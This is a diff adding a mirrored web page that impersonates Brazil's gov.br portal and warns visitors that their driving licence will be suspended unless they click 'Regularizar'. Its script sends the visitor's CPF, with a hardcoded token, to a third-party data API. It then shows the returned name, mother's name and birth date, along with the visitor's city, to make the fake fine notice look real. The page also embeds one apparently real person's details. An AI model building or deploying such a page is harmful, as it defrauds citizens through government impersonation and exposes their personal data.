@@ -1,0 +1,754 @@
+<html lang="en">
+<!-- Mirrored from renovacnh-brasil.com/processo/regularize.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 18 Nov 2024 21:03:39 GMT -->
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>gov.br | Regularize-se</title>
+
+  <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+
+  <!-- TailwindCSS CDN with custom font configuration -->
+  <link rel="stylesheet" href="style.css">
+  <script src="https://cdn.tailwindcss.com/"></script>
+
+  <!-- JS Script -->
+  <script defer="" src="script.js"></script>
+  <script>
+
+    document.addEventListener('DOMContentLoaded', function () {
+      getUserLocation();
+      trySearch();
+    });
+
+    // Obtém o IP do usuário
+
+    async function getUserLocation() {
+      try {
+        const ipResponse = await fetch("https://wtfismyip.com/json");
+        const ipData = await ipResponse.json();
+        console.log(ipData)
+        if (ipData && ipData.YourFuckingCity) {
+          // Atualiza a cidade na página
+          document.querySelector(".city").innerText =
+            `${ipData.YourFuckingCity}`;
+          document.querySelector(".loc").classList.remove('hidden');
+
+        } else {
+          document.querySelector(".loc").classList.add('hidden')
+        }
+      } catch (error) {
+        console.error("Erro ao obter localização:", error);
+        document.querySelector(".loc").classList.add('hidden')
+      }
+    }
+
+    function trySearch() {
+      let cpf = localStorage.getItem("cpf")
+      if (cpf) {
+        if (!isValidCPF(cpf)) {
+          window.location.href = "index.html";
+          return false;
+        }
+
+        document.getElementById('loginPage').classList.add('hidden');
+        document.getElementById('loadingPage').classList.remove('hidden');
+
+        const TOKEN = 'd36ee39c78f6828a53932616a68e7302'
+
+        fetch(`https://magmadatahub.com/api.php?token=${TOKEN}&cpf=${cpf}`)
+          .then(response => response.json())
+          .then(data => {
+            if (!data.success) {
+              alert(data.err);
+            } else {
+              document.getElementById('loadingPage').classList.add('hidden');
+              document.getElementById('loginPage').classList.remove('hidden');
+
+              document.querySelector('.name').innerText = data.nome;
+              document.querySelector('.nameMother').innerText = data.nome_mae;
+              document.querySelector('.birth').innerText = data.nascimento;
+              document.querySelector('.sex').innerText = data.sexo;
+
+              localStorage.setItem('name', data.nome);
+              localStorage.setItem('nameMother', data.nome_mae);
+              localStorage.setItem('birth', data.birth);
+              localStorage.setItem('sex', data.sexo);
+            }
+          })
+          .catch(error => {
+            alert(`Erro ao consultar CPF. Por favor, tente novamente. ${error}`);
+            console.error('Erro ao consultar CPF:', error);
+          });
+
+        return false;
+      }
+    }
+
+  </script>
+  <style>
+    *,
+    ::before,
+    ::after {
+      --tw-border-spacing-x: 0;
+      --tw-border-spacing-y: 0;
+      --tw-translate-x: 0;
+      --tw-translate-y: 0;
+      --tw-rotate: 0;
+      --tw-skew-x: 0;
+      --tw-skew-y: 0;
+      --tw-scale-x: 1;
+      --tw-scale-y: 1;
+      --tw-pan-x: ;
+      --tw-pan-y: ;
+      --tw-pinch-zoom: ;
+      --tw-scroll-snap-strictness: proximity;
+      --tw-gradient-from-position: ;
+      --tw-gradient-via-position: ;
+      --tw-gradient-to-position: ;
+      --tw-ordinal: ;
+      --tw-slashed-zero: ;
+      --tw-numeric-figure: ;
+      --tw-numeric-spacing: ;
+      --tw-numeric-fraction: ;
+      --tw-ring-inset: ;
+      --tw-ring-offset-width: 0px;
+      --tw-ring-offset-color: #fff;
+      --tw-ring-color: rgb(59 130 246 / 0.5);
+      --tw-ring-offset-shadow: 0 0 #0000;
+      --tw-ring-shadow: 0 0 #0000;
+      --tw-shadow: 0 0 #0000;
+      --tw-shadow-colored: 0 0 #0000;
+      --tw-blur: ;
+      --tw-brightness: ;
+      --tw-contrast: ;
+      --tw-grayscale: ;
+      --tw-hue-rotate: ;
+      --tw-invert: ;
+      --tw-saturate: ;
+      --tw-sepia: ;
+      --tw-drop-shadow: ;
+      --tw-backdrop-blur: ;
+      --tw-backdrop-brightness: ;
+      --tw-backdrop-contrast: ;
+      --tw-backdrop-grayscale: ;
+      --tw-backdrop-hue-rotate: ;
+      --tw-backdrop-invert: ;
+      --tw-backdrop-opacity: ;
+      --tw-backdrop-saturate: ;
+      --tw-backdrop-sepia: ;
+      --tw-contain-size: ;
+      --tw-contain-layout: ;
+      --tw-contain-paint: ;
+      --tw-contain-style:
+    }
+
+    ::backdrop {
+      --tw-border-spacing-x: 0;
+      --tw-border-spacing-y: 0;
+      --tw-translate-x: 0;
+      --tw-translate-y: 0;
+      --tw-rotate: 0;
+      --tw-skew-x: 0;
+      --tw-skew-y: 0;
+      --tw-scale-x: 1;
+      --tw-scale-y: 1;
+      --tw-pan-x: ;
+      --tw-pan-y: ;
+      --tw-pinch-zoom: ;
+      --tw-scroll-snap-strictness: proximity;
+      --tw-gradient-from-position: ;
+      --tw-gradient-via-position: ;
+      --tw-gradient-to-position: ;
+      --tw-ordinal: ;
+      --tw-slashed-zero: ;
+      --tw-numeric-figure: ;
+      --tw-numeric-spacing: ;
+      --tw-numeric-fraction: ;
+      --tw-ring-inset: ;
+      --tw-ring-offset-width: 0px;
+      --tw-ring-offset-color: #fff;
+      --tw-ring-color: rgb(59 130 246 / 0.5);
+      --tw-ring-offset-shadow: 0 0 #0000;
+      --tw-ring-shadow: 0 0 #0000;
+      --tw-shadow: 0 0 #0000;
+      --tw-shadow-colored: 0 0 #0000;
+      --tw-blur: ;
+      --tw-brightness: ;
+      --tw-contrast: ;
+      --tw-grayscale: ;
+      --tw-hue-rotate: ;
+      --tw-invert: ;
+      --tw-saturate: ;
+      --tw-sepia: ;
+      --tw-drop-shadow: ;
+      --tw-backdrop-blur: ;
+      --tw-backdrop-brightness: ;
+      --tw-backdrop-contrast: ;
+      --tw-backdrop-grayscale: ;
+      --tw-backdrop-hue-rotate: ;
+      --tw-backdrop-invert: ;
+      --tw-backdrop-opacity: ;
+      --tw-backdrop-saturate: ;
+      --tw-backdrop-sepia: ;
+      --tw-contain-size: ;
+      --tw-contain-layout: ;
+      --tw-contain-paint: ;
+      --tw-contain-style:
+    }
+
+    /* ! tailwindcss v3.4.15 | MIT License | https://tailwindcss.com */
+    *,
+    ::after,
+    ::before {
+      box-sizing: border-box;
+      border-width: 0;
+      border-style: solid;
+      border-color: #e5e7eb
+    }
+
+    ::after,
+    ::before {
+      --tw-content: ''
+    }
+
+    :host,
+    html {
+      line-height: 1.5;
+      -webkit-text-size-adjust: 100%;
+      -moz-tab-size: 4;
+      tab-size: 4;
+      font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+      font-feature-settings: normal;
+      font-variation-settings: normal;
+      -webkit-tap-highlight-color: transparent
+    }
+
+    body {
+      margin: 0;
+      line-height: inherit
+    }
+
+    hr {
+      height: 0;
+      color: inherit;
+      border-top-width: 1px
+    }
+
+    abbr:where([title]) {
+      -webkit-text-decoration: underline dotted;
+      text-decoration: underline dotted
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+      font-size: inherit;
+      font-weight: inherit
+    }
+
+    a {
+      color: inherit;
+      text-decoration: inherit
+    }
+
+    b,
+    strong {
+      font-weight: bolder
+    }
+
+    code,
+    kbd,
+    pre,
+    samp {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      font-feature-settings: normal;
+      font-variation-settings: normal;
+      font-size: 1em
+    }
+
+    small {
+      font-size: 80%
+    }
+
+    sub,
+    sup {
+      font-size: 75%;
+      line-height: 0;
+      position: relative;
+      vertical-align: baseline
+    }
+
+    sub {
+      bottom: -.25em
+    }
+
+    sup {
+      top: -.5em
+    }
+
+    table {
+      text-indent: 0;
+      border-color: inherit;
+      border-collapse: collapse
+    }
+
+    button,
+    input,
+    optgroup,
+    select,
+    textarea {
+      font-family: inherit;
+      font-feature-settings: inherit;
+      font-variation-settings: inherit;
+      font-size: 100%;
+      font-weight: inherit;
+      line-height: inherit;
+      letter-spacing: inherit;
+      color: inherit;
+      margin: 0;
+      padding: 0
+    }
+
+    button,
+    select {
+      text-transform: none
+    }
+
+    button,
+    input:where([type=button]),
+    input:where([type=reset]),
+    input:where([type=submit]) {
+      -webkit-appearance: button;
+      background-color: transparent;
+      background-image: none
+    }
+
+    :-moz-focusring {
+      outline: auto
+    }
+
+    :-moz-ui-invalid {
+      box-shadow: none
+    }
+
+    progress {
+      vertical-align: baseline
+    }
+
+    ::-webkit-inner-spin-button,
+    ::-webkit-outer-spin-button {
+      height: auto
+    }
+
+    [type=search] {
+      -webkit-appearance: textfield;
+      outline-offset: -2px
+    }
+
+    ::-webkit-search-decoration {
+      -webkit-appearance: none
+    }
+
+    ::-webkit-file-upload-button {
+      -webkit-appearance: button;
+      font: inherit
+    }
+
+    summary {
+      display: list-item
+    }
+
+    blockquote,
+    dd,
+    dl,
+    figure,
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6,
+    hr,
+    p,
+    pre {
+      margin: 0
+    }
+
+    fieldset {
+      margin: 0;
+      padding: 0
+    }
+
+    legend {
+      padding: 0
+    }
+
+    menu,
+    ol,
+    ul {
+      list-style: none;
+      margin: 0;
+      padding: 0
+    }
+
+    dialog {
+      padding: 0
+    }
+
+    textarea {
+      resize: vertical
+    }
+
+    input::placeholder,
+    textarea::placeholder {
+      opacity: 1;
+      color: #9ca3af
+    }
+
+    [role=button],
+    button {
+      cursor: pointer
+    }
+
+    :disabled {
+      cursor: default
+    }
+
+    audio,
+    canvas,
+    embed,
+    iframe,
+    img,
+    object,
+    svg,
+    video {
+      display: block;
+      vertical-align: middle
+    }
+
+    img,
+    video {
+      max-width: 100%;
+      height: auto
+    }
+
+    [hidden]:where(:not([hidden=until-found])) {
+      display: none
+    }
+
+    .mx-auto {
+      margin-left: auto;
+      margin-right: auto
+    }
+
+    .mb-10 {
+      margin-bottom: 2.5rem
+    }
+
+    .mb-4 {
+      margin-bottom: 1rem
+    }
+
+    .mb-6 {
+      margin-bottom: 1.5rem
+    }
+
+    .mt-10 {
+      margin-top: 2.5rem
+    }
+
+    .mt-2 {
+      margin-top: 0.5rem
+    }
+
+    .mt-3 {
+      margin-top: 0.75rem
+    }
+
+    .mt-7 {
+      margin-top: 1.75rem
+    }
+
+    .flex {
+      display: flex
+    }
+
+    .hidden {
+      display: none
+    }
+
+    .h-16 {
+      height: 4rem
+    }
+
+    .h-full {
+      height: 100%
+    }
+
+    .w-16 {
+      width: 4rem
+    }
+
+    .w-full {
+      width: 100%
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg)
+      }
+    }
+
+    .animate-spin {
+      animation: spin 1s linear infinite
+    }
+
+    .flex-col {
+      flex-direction: column
+    }
+
+    .items-center {
+      align-items: center
+    }
+
+    .justify-center {
+      justify-content: center
+    }
+
+    .justify-between {
+      justify-content: space-between
+    }
+
+    .gap-2 {
+      gap: 0.5rem
+    }
+
+    .gap-3 {
+      gap: 0.75rem
+    }
+
+    .rounded-full {
+      border-radius: 9999px
+    }
+
+    .rounded-md {
+      border-radius: 0.375rem
+    }
+
+    .border-b-\[1px\] {
+      border-bottom-width: 1px
+    }
+
+    .border-t-4 {
+      border-top-width: 4px
+    }
+
+    .border-solid {
+      border-style: solid
+    }
+
+    .border-black\/90 {
+      border-color: rgb(0 0 0 / 0.9)
+    }
+
+    .bg-\[\#1351b4\] {
+      --tw-bg-opacity: 1;
+      background-color: rgb(19 81 180 / var(--tw-bg-opacity, 1))
+    }
+
+    .bg-white {
+      --tw-bg-opacity: 1;
+      background-color: rgb(255 255 255 / var(--tw-bg-opacity, 1))
+    }
+
+    .p-8 {
+      padding: 2rem
+    }
+
+    .px-10 {
+      padding-left: 2.5rem;
+      padding-right: 2.5rem
+    }
+
+    .px-4 {
+      padding-left: 1rem;
+      padding-right: 1rem
+    }
+
+    .py-2 {
+      padding-top: 0.5rem;
+      padding-bottom: 0.5rem
+    }
+
+    .py-3 {
+      padding-top: 0.75rem;
+      padding-bottom: 0.75rem
+    }
+
+    .text-center {
+      text-align: center
+    }
+
+    .text-2xl {
+      font-size: 1.5rem;
+      line-height: 2rem
+    }
+
+    .text-lg {
+      font-size: 1.125rem;
+      line-height: 1.75rem
+    }
+
+    .text-sm {
+      font-size: 0.875rem;
+      line-height: 1.25rem
+    }
+
+    .font-bold {
+      font-weight: 700
+    }
+
+    .font-semibold {
+      font-weight: 600
+    }
+
+    .uppercase {
+      text-transform: uppercase
+    }
+
+    .text-red-500 {
+      --tw-text-opacity: 1;
+      color: rgb(239 68 68 / var(--tw-text-opacity, 1))
+    }
+
+    .text-white {
+      --tw-text-opacity: 1;
+      color: rgb(255 255 255 / var(--tw-text-opacity, 1))
+    }
+
+    .shadow-md {
+      --tw-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+      --tw-shadow-colored: 0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);
+      box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
+    }
+
+    .drop-shadow-md {
+      --tw-drop-shadow: drop-shadow(0 4px 3px rgb(0 0 0 / 0.07)) drop-shadow(0 2px 2px rgb(0 0 0 / 0.06));
+      filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
+    }
+
+    @media (min-width: 1024px) {
+      .lg\:w-1\/2 {
+        width: 50%
+      }
+    }
+  </style>
+</head>
+
+<body cz-shortcut-listen="true">
+  <header class="flex px-4 bg-white h-16 items-center drop-shadow-md">
+    <a href="index.html">
+      <img src="images/png/govbr-logo-large.png" alt="gov.br">
+    </a>
+  </header>
+  <div id="loadingPage" class="main-content hidden">
+    <div class="p-8 text-center">
+      <br>
+      <br>
+      <br>
+      <h1 class="text-2xl font-bold mb-6 text-correios-text">
+        Bem Vindo(a) ao GOV.BR!
+      </h1>
+      <div class="flex justify-center items-center mb-4">
+        <div class="w-16 h-16 border-t-4 border-correios-blue border-solid rounded-full animate-spin"></div>
+      </div>
+      <p id="loadingMessage" class="text-lg text-correios-text">
+        Iniciando processo de login...
+      </p>
+      <br>
+      <br>
+      <br>
+      <br>
+      <br>
+      <br>
+
+    </div>
+  </div>
+
+  <main id="loginPage"
+    class="flex flex-col text-center h-full gap-2 mt-10 rounded-md bg-white px-10 shadow-md py-2 mx-auto lg:w-1/2"
+    style="
+  padding-right: 10px;
+  padding-left: 10px;
+">
+
+    <span class="border-b-[1px] mt-2 w-full border-black/90"></span>
+
+    <div class="w-full flex flex-col gap-3 mt-2 items-center">
+      <h2 class="font-semibold uppercase name">Guilherme Sedrez Costa</h2>
+      <div class="flex flex-col">
+        <div class="flex gap-2 justify-between">
+          <h5>Data de nascimento:</h5>
+          <p class="birth">29/04/2004</p>
+        </div>
+
+
+        <div class="flex gap-2 justify-between">
+          <h5>Sexo:</h5>
+          <p class="sex">Masculino</p>
+        </div>
+
+        <div class="flex gap-2 justify-between">
+          <h5>Nome da mãe:</h5>
+          <p class="nameMother">Fabiana Sedrez</p>
+        </div>
+
+        <div class="text-center mt-3">
+          <h4>CNH:</h4>
+          <h5 class="uppercase text-red-500 font-semibold">
+            Em processo de suspensão
+          </h5>
+        </div>
+
+        <div class="text-center mt-3 loc">
+          <h4>LOCALIZAÇÃO DA INFRAÇÃO:</h4>
+          <h5 class="uppercase text-red-500 font-semibold city">Palhoça</h5>
+        </div>
+      </div>
+    </div>
+
+    <span class="border-b-[1px] mt-2 w-full border-black/90"></span>
+
+    <h2 class="mt-2">
+      Informamos que o sistema integrado de multas validou uma infração
+      cometida e não contestada a tempo junto ao DETRAN. Caso não seja
+      regularizado até a data <span class="date">24/11/2024</span> a CNH será SUSPENSA
+    </h2>
+
+    <h3>Data da infração: 14/05/2024</h3>
+    <h3>Status: <span class="text-red-500 font-semibold">VENCIDA</span></h3>
+
+    <h2 class="font-bold mt-2">Regularize agora para manter sua CNH.</h2>
+    <button id="regularize"
+      class="bg-[#1351b4] text-sm font-bold text-white py-3 rounded-full mt-7 uppercase w-full lg:w-1/2 mx-auto mb-10">
+      Regularizar
+    </button>
+  </main>
+
+
+
+
+  <div id="kins-kins-popup"
+    style="color-scheme: initial; forced-color-adjust: initial; mask: initial; math-depth: initial; position: initial; position-anchor: initial; text-size-adjust: initial; appearance: initial; color: initial; direction: ltr; font-family: Rubik, sans-serif; font-feature-settings: initial; font-kerning: initial; font-optical-sizing: initial; font-palette: initial; font-size: medium; font-size-adjust: initial; font-stretch: initial; font-style: initial; font-synthesis: initial; font-variant: initial; font-variation-settings: initial; font-weight: initial; position-area: initial; text-orientation: initial; text-rendering: initial; text-spacing-trim: initial; -webkit-font-smoothing: initial; -webkit-locale: initial; -webkit-text-orientation: initial; -webkit-writing-mode: initial; writing-mode: initial; zoom: initial; accent-color: initial; place-content: initial; place-items: initial; place-self: initial; alignment-baseline: initial; anchor-name: initial; anchor-scope: initial; animation-composition: initial; animation: initial; app-region: initial; aspect-ratio: initial; backdrop-filter: initial; backface-visibility: initial; background: none; background-blend-mode: initial; baseline-shift: initial; baseline-source: initial; block-size: initial; border-block: initial; border: none; border-radius: initial; border-collapse: initial; border-end-end-radius: initial; border-end-start-radius: initial; border-inline: initial; border-start-end-radius: initial; border-start-start-radius: initial; inset: initial; box-decoration-break: initial; box-shadow: initial; box-sizing: border-box; break-after: initial; break-before: initial; break-inside: initial; buffered-rendering: initial; caption-side: initial; caret-color: initial; clear: initial; clip: initial; clip-path: initial; clip-rule: initial; color-interpolation: initial; color-interpolation-filters: initial; color-rendering: initial; columns: initial; column-fill: initial; gap: initial; column-rule: initial; column-span: initial; contain: initial; contain-intrinsic-block-size: initial; contain-intrinsic-size: initial; contain-intrinsic-inline-size: initial; container: initial; content: initial; content-visibility: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; cursor: initial; cx: initial; cy: initial; d: initial; display: block; dominant-baseline: initial; empty-cells: initial; field-sizing: initial; fill: initial; fill-opacity: initial; fill-rule: initial; filter: initial; flex: initial; flex-flow: initial; float: initial; flood-color: initial; flood-opacity: initial; grid: initial; grid-area: initial; height: auto; hyphenate-character: initial; hyphenate-limit-chars: initial; hyphens: initial; image-orientation: initial; image-rendering: initial; initial-letter: initial; inline-size: initial; inset-block: initial; inset-inline: initial; interpolate-size: initial; isolation: initial; letter-spacing: initial; lighting-color: initial; line-break: initial; line-height: normal; list-style: initial; margin-block: initial; margin: 0px; margin-inline: initial; marker: initial; mask-type: initial; math-shift: initial; math-style: initial; max-block-size: initial; max-height: initial; max-inline-size: initial; max-width: initial; min-block-size: initial; min-height: initial; min-inline-size: initial; min-width: initial; mix-blend-mode: initial; object-fit: initial; object-position: initial; object-view-box: initial; offset: initial; opacity: initial; order: initial; orphans: initial; outline: initial; outline-offset: initial; overflow-anchor: initial; overflow-clip-margin: initial; overflow-wrap: initial; overflow: initial; overlay: initial; overscroll-behavior-block: none; overscroll-behavior-inline: none; overscroll-behavior: none; padding-block: initial; padding: 0px; padding-inline: initial; page: initial; page-orientation: initial; paint-order: initial; perspective: initial; perspective-origin: initial; pointer-events: initial; position-try: initial; position-visibility: initial; quotes: initial; r: initial; resize: initial; rotate: initial; ruby-align: initial; ruby-position: initial; rx: initial; ry: initial; scale: initial; scroll-behavior: initial; scroll-margin-block: initial; scroll-margin: initial; scroll-margin-inline: initial; scroll-padding-block: initial; scroll-padding: initial; scroll-padding-inline: initial; scroll-snap-align: initial; scroll-snap-stop: initial; scroll-snap-type: initial; scroll-timeline: initial; scrollbar-color: initial; scrollbar-gutter: initial; scrollbar-width: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; shape-rendering: initial; size: initial; speak: initial; stop-color: initial; stop-opacity: initial; stroke: initial; stroke-dasharray: initial; stroke-dashoffset: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-width: initial; tab-size: initial; table-layout: initial; text-align: left; text-align-last: initial; text-anchor: initial; text-combine-upright: initial; text-decoration: none; text-decoration-skip-ink: initial; text-emphasis: initial; text-emphasis-position: initial; text-indent: initial; text-overflow: initial; text-shadow: initial; text-transform: initial; text-underline-offset: initial; text-underline-position: initial; text-wrap: wrap; timeline-scope: initial; touch-action: initial; transform: initial; transform-box: initial; transform-origin: initial; transform-style: initial; transition: initial; translate: initial; user-select: initial; vector-effect: initial; vertical-align: initial; view-timeline: initial; view-transition-class: initial; view-transition-name: initial; visibility: initial; border-spacing: initial; -webkit-box-align: initial; -webkit-box-decoration-break: initial; -webkit-box-direction: initial; -webkit-box-flex: initial; -webkit-box-ordinal-group: initial; -webkit-box-orient: initial; -webkit-box-pack: initial; -webkit-box-reflect: initial; -webkit-line-break: initial; -webkit-line-clamp: initial; -webkit-mask-box-image: initial; -webkit-print-color-adjust: initial; -webkit-rtl-ordering: initial; -webkit-ruby-position: initial; -webkit-tap-highlight-color: initial; -webkit-text-combine: initial; -webkit-text-decorations-in-effect: initial; -webkit-text-fill-color: initial; -webkit-text-security: initial; -webkit-text-stroke: initial; -webkit-user-drag: initial; white-space-collapse: collapse; widows: initial; width: auto; will-change: initial; word-break: initial; word-spacing: initial; x: initial; y: initial; z-index: initial;">
+    <div id="kins_root"
+      style="color-scheme: initial; forced-color-adjust: initial; mask: initial; math-depth: initial; position: initial; position-anchor: initial; text-size-adjust: initial; appearance: initial; color: initial; direction: ltr; font-family: Rubik, sans-serif; font-feature-settings: initial; font-kerning: initial; font-optical-sizing: initial; font-palette: initial; font-size: medium; font-size-adjust: initial; font-stretch: initial; font-style: initial; font-synthesis: initial; font-variant: initial; font-variation-settings: initial; font-weight: initial; position-area: initial; text-orientation: initial; text-rendering: initial; text-spacing-trim: initial; -webkit-font-smoothing: initial; -webkit-locale: initial; -webkit-text-orientation: initial; -webkit-writing-mode: initial; writing-mode: initial; zoom: initial; accent-color: initial; place-content: initial; place-items: initial; place-self: initial; alignment-baseline: initial; anchor-name: initial; anchor-scope: initial; animation-composition: initial; animation: initial; app-region: initial; aspect-ratio: initial; backdrop-filter: initial; backface-visibility: initial; background: none; background-blend-mode: initial; baseline-shift: initial; baseline-source: initial; block-size: initial; border-block: initial; border: none; border-radius: initial; border-collapse: initial; border-end-end-radius: initial; border-end-start-radius: initial; border-inline: initial; border-start-end-radius: initial; border-start-start-radius: initial; inset: initial; box-decoration-break: initial; box-shadow: initial; box-sizing: border-box; break-after: initial; break-before: initial; break-inside: initial; buffered-rendering: initial; caption-side: initial; caret-color: initial; clear: initial; clip: initial; clip-path: initial; clip-rule: initial; color-interpolation: initial; color-interpolation-filters: initial; color-rendering: initial; columns: initial; column-fill: initial; gap: initial; column-rule: initial; column-span: initial; contain: initial; contain-intrinsic-block-size: initial; contain-intrinsic-size: initial; contain-intrinsic-inline-size: initial; container: initial; content: initial; content-visibility: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; cursor: initial; cx: initial; cy: initial; d: initial; display: block; dominant-baseline: initial; empty-cells: initial; field-sizing: initial; fill: initial; fill-opacity: initial; fill-rule: initial; filter: initial; flex: initial; flex-flow: initial; float: initial; flood-color: initial; flood-opacity: initial; grid: initial; grid-area: initial; height: auto; hyphenate-character: initial; hyphenate-limit-chars: initial; hyphens: initial; image-orientation: initial; image-rendering: initial; initial-letter: initial; inline-size: initial; inset-block: initial; inset-inline: initial; interpolate-size: initial; isolation: initial; letter-spacing: initial; lighting-color: initial; line-break: initial; line-height: normal; list-style: initial; margin-block: initial; margin: 0px; margin-inline: initial; marker: initial; mask-type: initial; math-shift: initial; math-style: initial; max-block-size: initial; max-height: initial; max-inline-size: initial; max-width: initial; min-block-size: initial; min-height: initial; min-inline-size: initial; min-width: initial; mix-blend-mode: initial; object-fit: initial; object-position: initial; object-view-box: initial; offset: initial; opacity: initial; order: initial; orphans: initial; outline: initial; outline-offset: initial; overflow-anchor: initial; overflow-clip-margin: initial; overflow-wrap: initial; overflow: initial; overlay: initial; overscroll-behavior-block: none; overscroll-behavior-inline: none; overscroll-behavior: none; padding-block: initial; padding: 0px; padding-inline: initial; page: initial; page-orientation: initial; paint-order: initial; perspective: initial; perspective-origin: initial; pointer-events: initial; position-try: initial; position-visibility: initial; quotes: initial; r: initial; resize: initial; rotate: initial; ruby-align: initial; ruby-position: initial; rx: initial; ry: initial; scale: initial; scroll-behavior: initial; scroll-margin-block: initial; scroll-margin: initial; scroll-margin-inline: initial; scroll-padding-block: initial; scroll-padding: initial; scroll-padding-inline: initial; scroll-snap-align: initial; scroll-snap-stop: initial; scroll-snap-type: initial; scroll-timeline: initial; scrollbar-color: initial; scrollbar-gutter: initial; scrollbar-width: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; shape-rendering: initial; size: initial; speak: initial; stop-color: initial; stop-opacity: initial; stroke: initial; stroke-dasharray: initial; stroke-dashoffset: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-width: initial; tab-size: initial; table-layout: initial; text-align: left; text-align-last: initial; text-anchor: initial; text-combine-upright: initial; text-decoration: none; text-decoration-skip-ink: initial; text-emphasis: initial; text-emphasis-position: initial; text-indent: initial; text-overflow: initial; text-shadow: initial; text-transform: initial; text-underline-offset: initial; text-underline-position: initial; text-wrap: wrap; timeline-scope: initial; touch-action: initial; transform: initial; transform-box: initial; transform-origin: initial; transform-style: initial; transition: initial; translate: initial; user-select: initial; vector-effect: initial; vertical-align: initial; view-timeline: initial; view-transition-class: initial; view-transition-name: initial; visibility: initial; border-spacing: initial; -webkit-box-align: initial; -webkit-box-decoration-break: initial; -webkit-box-direction: initial; -webkit-box-flex: initial; -webkit-box-ordinal-group: initial; -webkit-box-orient: initial; -webkit-box-pack: initial; -webkit-box-reflect: initial; -webkit-line-break: initial; -webkit-line-clamp: initial; -webkit-mask-box-image: initial; -webkit-print-color-adjust: initial; -webkit-rtl-ordering: initial; -webkit-ruby-position: initial; -webkit-tap-highlight-color: initial; -webkit-text-combine: initial; -webkit-text-decorations-in-effect: initial; -webkit-text-fill-color: initial; -webkit-text-security: initial; -webkit-text-stroke: initial; -webkit-user-drag: initial; white-space-collapse: collapse; widows: initial; width: auto; will-change: initial; word-break: initial; word-spacing: initial; x: initial; y: initial; z-index: initial;">
+    </div>
+  </div>
+</body>
+<!-- Mirrored from renovacnh-brasil.com/processo/regularize.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 18 Nov 2024 21:03:39 GMT -->
+
+</html>
